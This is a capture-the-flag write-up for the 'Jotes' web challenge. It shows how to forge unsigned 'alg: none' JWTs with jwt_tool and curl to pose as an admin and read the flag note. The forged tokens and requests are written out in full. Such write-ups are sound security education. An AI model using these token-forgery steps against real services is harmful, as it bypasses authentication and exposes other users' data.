# Jotes

Category: Web

## Description

> Welcome to our note taking app, I hope you can't see what we're writing

A website was attached.

## Solution

Jotes is a cool note taking application that uses [TuiCss](https://github.com/vinibiavatti1/TuiCss)
to create a UI based on ASCII tables, like the old MS-DOS applications.

We can register by providing a username and password, then login to view the notes.  
The application is happy to inform us that "NEWS: We've added new algorithms to JWT verification",
pointing us to inspect the token we receive upon login:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Jotes]
└─$ curl 'https://jwt-notes-web.2024-bq.ctfcompetition.com/login' -X POST -H 'Content-Type: application/json' --data-raw
 '{"username":"test","password":"test"}' -v -s 2>&1 | grep cookie
< set-cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxNiwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6InRlc3QifQ.q_ixslTATBXTtgTAMgiYnbZCRmxkGJDZ1V_MLWy9_rc; HttpOnly; Path=/; SameSite=Strict
```

We can use this token to read the user's notes via a dedicated API:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Jotes]
└─$ curl 'https://jwt-notes-web.2024-bq.ctfcompetition.com/notes' -H 'Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxNiwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6InRlc3QifQ.q_ixslTATBXTtgTAMgiYnbZCRmxkGJDZ1V_MLWy9_rc'
{"notes":[],"success":true}
```

Let's take a closer look at the token:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Jotes]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxNiwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6InRlc3QifQ.q_ixslTATBXTtgTAMgiYnbZCRmxkGJDZ1V_MLWy9_rc

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] user_id = 16
[+] role = "user"
[+] username = "test"
```

Let's try to modify the username and role to "admin" and the user ID to "1" and see if we can
exploit some common misconfiguration in the token:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Jotes]
└─$ python3 ~/utils/web/jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxNiwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6InRlc3QifQ.q_ixslTATBXTtgTAMgiYnbZCRmxkGJDZ1V_MLWy9_rc  -X a -I -pc role -pv admin -pc user_id -pv 1 -pc username -pv admin

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

jwttool_3037d3465dfc8b911d68108fffee8288 - EXPLOIT: "alg":"none" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.
jwttool_614b5162166a79b158fbf08d39833926 - EXPLOIT: "alg":"None" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.
jwttool_76288c83873c1fabf4281b0ff055adb3 - EXPLOIT: "alg":"NONE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.
jwttool_714c494e8e8becea46e60836ef695a0d - EXPLOIT: "alg":"nOnE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.
```

First, we'll attempt to use the "alg: none" token instead of the one we originally got:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Jotes]
└─$ curl 'https://jwt-notes-web.2024-bq.ctfcompetition.com/notes' -H 'Cookie: auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.'
{"notes":[{"content":"Coffee pot malfunctioning. Bring backup or suffer. -Management","id":1,"title":"Coffee Crisis"},{"content":"Desk plant thirsty. Don't let her die like TPS reports.","id":2,"title":"Water Brenda!"},{"content":"Snacks, coffee, humor essential. Sleep = termination.","id":3,"title":"Meeting Marathon"},{"content":"Slightly used (jam-prone) stapler seeks new home. Creativity a plus.","id":4,"title":"Free Stapler"},{"content":"Pants optional, shirts mandatory. Strategic scarves encouraged.","id":5,"title":"Heatwave Dress Code"},{"content":"We hear your sighs AND singing. Please behave. -IT","id":6,"title":"IT Knows"},{"content":"Confess before cake-pocalypse!","id":7,"title":"Cake Thief!"},{"content":"CTF{n0_s1gN4tur3_r3qU1r3D}","id":8,"title":"Flag"},{"content":"Yes, there are snacks (besides gummy bears). Eat responsibly.","id":9,"title":"Snacks in Breakroom"}],"success":true}
```

Looks like we got lucky on our first try! The flag: `CTF{n0_s1gN4tur3_r3qU1r3D}`